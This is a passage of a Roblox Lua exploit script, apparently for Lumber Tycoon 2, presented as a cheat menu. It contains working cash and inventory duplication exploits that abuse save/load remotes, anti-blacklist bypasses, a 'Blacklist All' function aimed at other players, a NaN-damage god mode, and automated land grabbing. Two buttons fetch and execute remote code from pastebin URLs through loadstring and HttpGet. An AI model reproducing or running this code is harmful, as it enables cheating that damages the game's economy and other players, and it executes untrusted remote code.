		['AxeAmber']= 3.39;
		['ManyAxe']= 10.2;
		['BasicHatchet']= 0.2;
		['Axe1']= 0.55;
		['Axe2']= 0.93;
		['AxeAlphaTesters']= 1.5;
		['Rukiryaxe']= 1.68;
		['Axe3']= 1.45;
		['AxeBetaTesters']= 1.45;
		['FireAxe']= 0.6;
		['SilverAxe']= 1.6;
		['EndTimesAxe']= 1.58;
		['AxeChicken']= 0.9;
		['CandyCaneAxe']= 0;
		['AxeTwitter']= 1.65
	}
	function axe(Val)
		local A_1 = Val.CutEvent
		local A_2 = 
			{
				[""tool""] = game.Players.LocalPlayer.Character:FindFirstChild(""Tool""), 
				[""faceVector""] = Vector3.new(0, 0, -1), 
				[""height""] = 0.3, 
				[""sectionId""] = 1, 
				[""hitPoints""] = HitPoints[game.Players.LocalPlayer.Character:FindFirstChild(""Tool"").ToolName.Value], 
				[""cooldown""] = 0.112, 
				[""cuttingClass""] = ""Axe""
			}
		local Event = game:GetService(""ReplicatedStorage"").Interaction.RemoteProxy
		Event:FireServer(A_1, A_2)
	end
	local Ps = nil
	for i, v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players[PlayerName] then
			Ps = v.OriginSquare.Position + Vector3.new(0,30,0)
		end
	end
	for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:FindFirstChild(""TreeClass"") and v.TreeClass.Value == Wood and v.Name == ""Model"" then
			Teleport(v.WoodSection.Position.X,v.WoodSection.Position.Y,v.WoodSection.Position.Z)
			for i=1,50 do
				wait(0.0001)
				axe(v)
			end
			for i,v in pairs(Workspace.LogModels:GetChildren()) do
				if v:FindFirstChild(""Owner"") and v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
					v:MoveTo(Ps)
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
					v:MoveTo(Ps)
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
					v:MoveTo(Ps)
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
				end
			end
			Counter = Counter + 1
			if Quantitys - Counter == 0 then
				print(""Breaked"")
				break
			end
			wait(0.2)
		end
	end
	wait(0.2)
	for i, v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players[PlayerName] then
			Teleport(v.OriginSquare.Position.X, v.OriginSquare.Position.Y + 3.2, v.OriginSquare.Position.Z)
		end
	end
end

local Funcs; Funcs = {
	SaveSlot = function()
		Services.ReplicatedStorage.LoadSaveRequests.RequestSave:InvokeServer(Client.CurrentSaveSlot.Value)
	end,
	SendMoney = function(plr, amt)
		return Services.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(plr, amt, Client.CurrentSaveSlot.Value)
	end,

	DupeInventory = function()
		local Head = Client.Character:WaitForChild(""Head"")
		local Pos = Head.CFrame
		Head:Destroy()
		for _, v in next, Client.Backpack:GetChildren() do
			task.spawn(function()
				Services.ReplicatedStorage.Interaction.ClientInteracted:FireServer(v, ""Drop tool"", Pos)
			end)
		end
		Client.CharacterAdded:Wait()
		local hrp = Client.Character:WaitForChild(""HumanoidRootPart"")
		wait(1)
		hrp.CFrame = Pos
		if  DisableSave == true then
			Funcs.DupeInventory()
		end
	end,

	DupeCash = function()
		if DupingCash then return end
		local CurrentSlot = Client.CurrentSaveSlot
		local ReloadToSlot = CurrentSlot.Value
		if CurrentSlot.Value == -1 then
			return Notify(""Error!"", ""You must load your slot to duplicate your cash."", 5)
		end
		DupingCash = true
		if not DisableSave then
			wait()
		end
		local DupeAmt = Client.leaderstats.Money.Value
		Notify(""Cash Dupe"", ""Waiting for load cooldown"", 3)
		repeat
			wait(.25)
		until Services.ReplicatedStorage.LoadSaveRequests.ClientMayLoad:InvokeServer() == true
		Notify(""Cash Dupe"", ""Sending cash to client"", 3)
		repeat
			task.spawn(function()Funcs.SendMoney(Client, DupeAmt)end)
			wait(.25)
		until Client.leaderstats.Money.Value == 0
		Notify(""Cash Dupe"", ""Reloading"", 3)
		Services.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(-1)
		wait()
		Services.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(ReloadToSlot)
		repeat wait() until Client.leaderstats.Money.Value >= DupeAmt * 2
		Notify(""Success!"", ""Successfully duplicated your money!"", 4)
		if DisableSave then wait() end
		wait(1)
		Funcs.SaveSlot()
		DupingCash = false

	end
}



window:Section(""Player"")

-- WalkSpeed--
window:Slider(""WalkSpeed"",{location = Table, min = 16, max = 1000, default = 16, precise = true, flag = ""WS""},function()
	repeat wait()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Table[""WS""]
	until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end)
--JumpPower--
window:Slider(""JumpPower"", {location = Table, min = 50, max = 1000, default = 50, precise = true, flag = ""JP""}, function()
	repeat wait()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Table[""JP""]
	until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end)
--Fly Speed--
window:Slider(""FlySpeed"",{location = Table, min = 1, max = 1000000000000, default = 50, precise = true, flag = ""FlySpeed""},function()
	_G.Fly_Speed = Table[""FlySpeed""]
end)
--Fly--
window:Bind(""Fly G Disable"",{location = Table, flag = ""EnableFly"", default = Enum.KeyCode.F},function(e)
	
	local LP = game:service('Players').LocalPlayer
	local T = LP.Character.Torso
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 5
	local MOUSE = LP:GetMouse()


	local function FLY()
		_G.FLYING = Table[""EnableFly""]
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)


		spawn(function()
			repeat wait()
				LP.Character.Humanoid.PlatformStand = true
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
					if Table[""FlySpeed""] == 1 then
						SPEED = 50
					else
						SPEED = Table[""FlySpeed""]
					end
					
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
					BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
					BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0.1, 0)
				end
				BG.cframe = game.Workspace.CurrentCamera.CoordinateFrame
			until not _G.FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end

	MOUSE.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 1
		elseif KEY:lower() == 's' then
			CONTROL.B = -1
		elseif KEY:lower() == 'a' then
			CONTROL.L = -1 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = 1
		end
	end)

	MOUSE.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	
	local enabled = false
	
	local UserInputService = game:GetService(""UserInputService"")

	UserInputService.InputBegan:Connect(function(Input, gameprocess)
		if not gameprocess then
			if Input.KeyCode == Table[""EnableFly""] then
				if not enabled then
					enabled = true
					_G.FLYING = true
				else
					enabled = false
					_G.FLYING = false
				end

			end
			if Input.KeyCode == Enum.KeyCode.G then
				_G.FLYING = false
			end
		end

	end)
	


	FLY()
end)
--Teleport--
window:Section(""Teleport"")

window:Dropdown(""Wood R US"", {location = Table,flag = ""WoodRUS"",search = true --[[AddsSearchBar]], list = {""WoodRUS""} --[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]}, function()
	if Table[""WoodRUS""] then
		local function Teleport(Cframe)
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
		end
		Teleport(CFrame.new(265, 5, 57))
	end
end)

window:Bind(""Click Tp"",{location = Table, flag = ""G"", default = Enum.KeyCode.G},function()
	if Table[""G""] then
		local UIS = game:GetService(""UserInputService"")

		local Player = game.Players.LocalPlayer
		local Mouse = Player:GetMouse()


		local function GetCharacter()
			return game.Players.LocalPlayer.Character
		end

		local function Teleport(pos)
			local Char = GetCharacter()
			if Char then
				Char:MoveTo(pos)
			end
		end


		UIS.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
				Teleport(Mouse.Hit.p)
			end
		end)
	end
end)

function GetPlayer(String)
	local LocalPlayer = game:GetService(""Players"").LocalPlayer
	local Found = {}
	local strl = String:lower()

	for i,v in pairs(game:GetService(""Players""):GetPlayers()) do
		if v.Name:lower():sub(1, #String) == String:lower() then
			table.insert(Found,v)
		end
	end    
	return Found    
end


window:Dropdown(""Player"", {location = Table,flag = ""Plr"",search = true --[[AddsSearchBar]], list = {""Player""} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]}, function()

end)

window:Button(""To Player"" ,function()
	for i,v in pairs(GetPlayer(Table[""Plr""])) do
		Plr.Character.HumanoidRootPart.CFrame = game:GetService(""Players"")[v.Name].Character.HumanoidRootPart.CFrame
	end
end)

window:Button(""To Player Base"", function()
	local Plr = Table[""Plr""]
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players[Plr] then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,10,0)
		end
	end
end)



window:Section(""Car"")

window:Dropdown(""Hotpink"",{location = Table,flag = ""Hotpink"",search = true --[[AddsSearchBar]], list = {""Hotpink""} --[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()

end)

window:Bind(""Car Gen"",{location = Table, flag = ""CarGen"", default = Enum.KeyCode.C},function()
	if true then

	end
end)

window:Dropdown(""Wood R US"",{location = Table,flag = ""WoodRUS"",search = true --[[AddsSearchBar]], list = {""Wood R US""} --[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()

end)


window:Bind(""Click Tp"",{location = Table, flag = ""CTP"", default = Enum.KeyCode.V},function()
	if true then

	end
end)

window:Slider(""Car Speed"",{location = Table, min = 1, max = 10, default = 6, precise = true --[[ 0.00 instead of 0 ]], flag = ""CarSpeed""},function()
	if true  then
		local Value = Table[""CarSpeed""]
		local Seat = game.Players.LocalPlayer.Character.Humanoid.SeatPart
		if Seat ~= nil then
			if Seat.Name == ""DriveSeat"" then
				if Seat.Parent:FindFirstChild(""Configuration"") then
					if Seat.Parent.Configuration:FindFirstChild(""MaxSpeed"") then
						Seat.Parent.Configuration.MaxSpeed.Value = Value
					end
				end
			else
				game.StarterGui:SetCore(""SendNotification"", {Title = ""Error!"", Text = ""You have to be in the drivers seat"", Icon = """", Duration = 2.5})
			end
		else
			game.StarterGui:SetCore(""SendNotification"", {Title = ""Error!"", Text = ""You have to sit in a car"", Icon = """", Duration = 2.5})
		end
	end
end)

window:Bind(""Unflip Car"",{location = Table, flag = ""Unflip"", default = Enum.KeyCode.U},function()
	if Table[""Unflip""] then
		local function RotateCar()
			if game.Players.LocalPlayer.Character then 
				local Character = game.Players.LocalPlayer.Character
				if Character.Humanoid.SeatPart ~= nil then 
					local Car = Character.Humanoid.SeatPart.Parent
					spawn(function()
						local Pos = CFrame.new(Car.Main.Position)
						for i=1,5 do
							wait()
							Car:SetPrimaryPartCFrame(Pos * CFrame.Angles(math.rad(Character.HumanoidRootPart.Orientation.x), math.rad(Character.HumanoidRootPart.Orientation.y), 0))
							game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Car.Main)
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Car.Main)
						end
					end)
				end
			end
		end
		RotateCar()
	end
end)

window:Dropdown(""UtillityTruck"",{location = Table,flag = ""Utility"",search = true --[[AddsSearchBar]], list = {""Wood R US""} --[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()

end)


window:Button(""Bring Car"", function()

end)

window:Section(""Mod Size"")

window:Section(""Tree Teleports"")
 -- tree teleports
window:Button(""Cherry"", function()
	GetTree(""Cherry"", ""LocalPlayer"", 3)
end)

window:Button(""Generic"", function()
	GetTree(""Generic"", ""LocalPlayer"", 3)
end)

window:Button(""Birch"", function()
	GetTree(""Birch"", ""LocalPlayer"", 3)
end)

window:Button(""Fir"", function()
	GetTree(""Fir"", ""LocalPlayer"", 3)
end)

window:Button(""Pine"", function()
	GetTree(""Pine"", ""LocalPlayer"", 3)
end)

window:Button(""Sinister"", function()
	GetTree(""SpookyNeon"", ""LocalPlayer"", 3)
end)

window:Button(""Spooky"", function()
	GetTree(""Spooky"", ""LocalPlayer"", 3)
end)

window:Button(""Palm"", function()
	GetTree(""Palm"", ""LocalPlayer"", 3)
end)

window:Button(""Walnut"", function()
	GetTree(""Walnut"", ""LocalPlayer"", 3)
end)

window:Button(""SnowGlow"", function()
	GetTree(""SnowGlow"", ""LocalPlayer"", 3)
end)

window:Button(""Volcano"", function()
	GetTree(""Volcano"", ""LocalPlayer"", 3)
end)

window:Button(""Oak"", function()
	GetTree(""Oak"", ""LocalPlayer"", 3)
end)

window:Button(""Koa"", function()
	GetTree(""Koa"", ""LocalPlayer"", 3)
end)

window:Button(""Frost"", function()
	GetTree(""Frost"", ""LocalPlayer"", 3)
end)

window:Button(""CaveCrawler"", function()
	GetTree(""CaveCrawler"", ""LocalPlayer"", 3)
end)

window:Button(""GreenSwampy"", function()
	GetTree(""GreenSwampy"", ""LocalPlayer"", 3)
end)

window:Button(""GoldSwampy"", function()
	GetTree(""GoldSwampy"", ""LocalPlayer"", 3)
end)

window:Section(""Settings"")

--Search--
window:Search(Color3.fromRGB(0, 204, 255))

window:Button(""Rejoin Server"",function()
	local ts = game:GetService(""TeleportService"")

	local p = game:GetService(""Players"").LocalPlayer



	ts:Teleport(game.PlaceId, p)
end)

-- god mode for not dying in Lava --

window:Button(""GodMode"", function()
	game:GetService(""ReplicatedStorage"").Interaction.DamageHumanoid:FireServer(0 / 0)
end)
--unload the script
window:Button(""Unload Script"", function()
	local CoreGui = game:GetService(""CoreGui"")

	local function DestroyGui()
		game:GetService(""CoreGui"").Lib:Destroy()
	end

	DestroyGui()
end)
-- Credits For Script and UI --
window:Section(""Credits"")
window:Button(""Print Credits"", function()
	print(""UILIB:Sten"")
	print(""AxeDupe:XxDrvash04xX"")
	print(""CashDupe:0x95"")
	print(""Fly:XxDrvash04xX"")
	print(""Blacklist All:Dino ツ"")
	print(""Anti Blacklist:Dino ツ"")
	print(""JumpPower:0x95"")
	print(""WalkSpeed:0x95"")
	print(""DisableSaving:0x95"")
	print(""Search:XxDrvash04xX"")
	print(""NoFog:Dino ツ"")
	print(""MaxLand:Dino ツ"")
	print(""TweenTP:Dino ツ"")
	print(""Golden Axe:Dino ツ"")
	print(""Delete BP:Dino ツ"")
	print(""Paint:Dino ツ"")
	print(""WalkonWatter:Dino ツ"")
	print(""Car Flight:Dino ツ"")
	print(""Disable Fog:Dino ツ"")
	print(""Delete BP's:Dino ツ"")
	print(""Sell Wood:Dino ツ"")
	print(""Sell Planks:Dino ツ"")
	print(""TP Wood:Dino ツ"")
	print(""TP Planks:Dino ツ"")
	print(""Remove Tree's:Dino ツ"")
	print(""Mod Wood:Dino ツ"")
	print(""Copy Base:Dino ツ"")
	print(""CoolDown Bypass:0x95"")	
end)

-- Other Features --

window:Section(""Misc"")
window:Button(""Anti Blacklist"", function(v)
	local scr=getsenv(requirements.LP.PlayerGui.BlackListGUI.ClientBeBlacklisted)
	local old=scr.makeWalls
	local old2=scr.checkIfPlayerNeedsToBeKicked
	if v=='Enable'then
		scr.makeWalls=function()end
		scr.removeWalls()
		scr.checkIfPlayerNeedsToBeKicked=function()end
		local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
		requirements.connections.humCheck=game:GetService('RunService').RenderStepped:connect(function()
			pcall(function()
				oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
			end);
		end);
		for _,spawnLocation in next,workspace.Region_Main:children()do
			if spawnLocation:IsA('SpawnLocation')then
				spawnLocation.Touched:Connect(function(spawnPoint)
					if spawnPoint.Parent==requirements.LP.Character then 
						requirements.LP.Character.HumanoidRootPart.CFrame=oldPos
					end
				end)
			end;
		end;
	elseif v=='Disable'then 
		if requirements.connections.humCheck then 
			requirements.connections.humCheck:Disconnect();
			requirements.connections.humCheck=nil;
		end;
		scr.makeWalls=old;
		scr.checkIfPlayerNeedsToBeKicked=old2;
	end
end)

window:Button(""Blacklist All"", function()
	Client = game.ReplicatedStorage.Interaction.ClientSetListPlayer
	local players = game.Players
	for i, v in pairs(players:GetPlayers()) do
		if v.Name ~= players.LocalPlayer.Name then
			Client:InvokeServer(players.LocalPlayer.BlacklistFolder, v, true)
		end
	end
	players.PlayerAdded:connect(function(plr)
		Client:InvokeServer(players.LocalPlayer.BlacklistFolder, plr, true)
	end)
end)

window:Button(""Free Land"", function()
	print(""Coming Soon!"")
end)

window:Slider(""Slot"",{location = Table, min = 1, max = 6, default = 1, precise = true, flag = ""Slot""},function()
	Slot = tonumber(Table[""Slot""])

end)

local player = game.Players.LocalPlayer

local mouse = player:GetMouse()

scr=getsenv(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient);

bind = ""q"" 



mouse.KeyDown:connect(function(key)
	if key == bind then
		repeat wait()until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
		wait(1)
		wait(0.9)
		for i,v in next, game:GetService(""Workspace"").Properties:GetChildren() do
			if v:FindFirstChild(""Owner"") and v.Owner.Value == nil then
				game:GetService(""ReplicatedStorage"").PropertyPurchasing.ClientPurchasedProperty:FireServer(v,v.OriginSquare.Position)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,2,0)
				break
			end
		end
	end


	wait(3)

	local c = game.Workspace.Properties
	local n = print('working')
	for i, v in pairs(c:GetChildren()) do
		if v:FindFirstChild(""Owner"") and v.Owner.Value == game.Players.LocalPlayer then
			holebase = v; 
			maxland = v.OriginSquare;
		end;
	end;
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
		local n
	end;
	local function Expandbase(point)
		local Event = game:GetService(""ReplicatedStorage"").PropertyPurchasing.ClientExpandedProperty
		Event:FireServer(holebase, point)
	end;
	local spos = maxland.Position
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80))
	Notify(""Done Expanding Land!"")
end)


-- Max Land --

window:Button(""Maxland"", function()
	local VIM=game:GetService(""VirtualInputManager"")
	Notify(""Expanding Land..."");
	VIM:SendKeyEvent(true,""Q"",false,game)
	wait(0.1)
	VIM:SendKeyEvent(true,""T"",false,game)
	wait(0.1)
	VIM:SendKeyEvent(true,""P"",false,game)
	local function LoadSlot()
		local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.ClientMayLoad:InvokeServer(player)
		if LoadSlot then
			game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(Slot, player)
		end
	end
	LoadSlot()
end)

-- Mod Wood --

window:Button(""Mod Wood"", function()
	for _, Log in pairs(workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				for i,v in pairs(Log:GetChildren()) do
					if v.Name==""WoodSection"" then
						spawn(function()
							for i=1,10 do
								wait()
								v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
							end
						end)
					end
				end
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
						game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
					end
				end)
			end
		end
	end
	wait(2.0)
	for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
				for i=1,20 do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
					game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
				end
			end
		end
	end
end)

-- Remove Tree's --

window:Button(""Remove Tree's"", function()
	for i,v in pairs(game.Workspace:GetDescendants()) do
		if v.Name == ""WoodSection"" and v.Parent:FindFirstChild(""CutEvent"") then
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
			game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v.Parent)
		end
	end
	game.Workspace.DescendantAdded:connect(function(Thing)
		wait(0.1)
		if Thing.Name == ""WoodSection"" and Thing.Parent:FindFirstChild(""CutEvent"") then
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Thing.Parent)
			game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(Thing.Parent)
		end
	end)
end)

-- TP Planks--

window:Button(""TP Planks"", function()
	for _, Plank in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if Plank.Name==""Plank"" and Plank:findFirstChild(""Owner"") then
			if Plank.Owner.Value == game.Players.LocalPlayer then
				local sendNotice = game.ReplicatedStorage.Notices.SendUserNotice
				sendNotice:Fire(""Click where you want ALL the Planks to TP to"")
				local ButtonPress
				ButtonPress = game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
					local Square = game.Players.LocalPlayer:GetMouse().Target
					if (Square.Name == ""OriginSquare"" or Square.Name == ""Square"") then
						ButtonPress:Disconnect()
						Plank:MoveTo(Square.Position)
						for i=1,100 do
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
						end
					end
				end)
			end
		end
	end
end)

-- TP Wood --

window:Button(""TP Wood"", function()
	for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 20, 0))
				for i=1,100 do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
				end
			end
		end
	end
end)

-- Sell Planks --

window:Button(""Sell Planks"", function()
	for _, Plank in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if Plank.Name==""Plank"" and Plank:findFirstChild(""Owner"") then
			if Plank.Owner.Value == game.Players.LocalPlayer then
				for i,v in pairs(Plank:GetChildren()) do
					if v.Name==""WoodSection"" then
						spawn(function()
							for i=1,10 do
								wait()
								v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
							end
						end)
					end
				end
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
					end
				end)
			end
		end
	end
end)

-- Sell Wood --

window:Button(""Sell Wood"", function()
	for _, Log in pairs(workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				for i,v in pairs(Log:GetChildren()) do
					if v.Name==""WoodSection"" then
						spawn(function()
							for i=1,10 do
								wait()
								v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
							end
						end)
					end
				end
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
					end
				end)
			end
		end
	end
end)

-- Delete BP's -- 

window:Button(""Delete BP's"", function()
	loadstring(game:HttpGet(""https://pastebin.com/raw/1YR8cpNE"", true))()
end)

-- Paint --

window:Button(""Paint"", function()
	loadstring(game:HttpGet('https://pastebin.com/raw/3Bk4KVYq',true))()
end)


-- Disable Fog --

window:Toggle(""Disable Fog"", {location = Table, flag = ""DisableFog""}, function()
	if Table[""DisableFog""] then
		game.Lighting.Changed:connect(function()
			game.Lighting.FogEnd = 9999
			game.Lighting.Brightness = 2
		end)
	else
		game.Lighting.Changed:connect(function()
			game.Lighting.FogEnd = 0
			game.Lighting.Brightness = 0
		end)
	end
end)

window:Toggle(""Full Bright"", {location = Table}, ""FullBright"", function()
	if Table[""FullBright""] then
		game.Lighting.Brightness = 999
	else
		game.Lighting.Brightness = 30
	end
end)

-- Jesus --

window:Button(""Walk on Water"", function()
	for index, water in pairs(game.Workspace.Water:GetChildren()) do
		water.CanCollide = true
	end
end)

-- All BP's --

window:Button(""All BP's"", function()
	for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
		local clone = v:Clone()
		clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
	end
end)

-- Car Flight -- 

window:Button(""Car Flight"", function()
	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild(""Torso"") and game.Players.LocalPlayer.Character:findFirstChild(""Humanoid"")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local flying = true
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 500
	local speed = 0

	function Fly()
		local bg = Instance.new(""BodyGyro"", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new(""BodyVelocity"", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character.Humanoid.PlatformStand = false
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+125.0+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-250
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
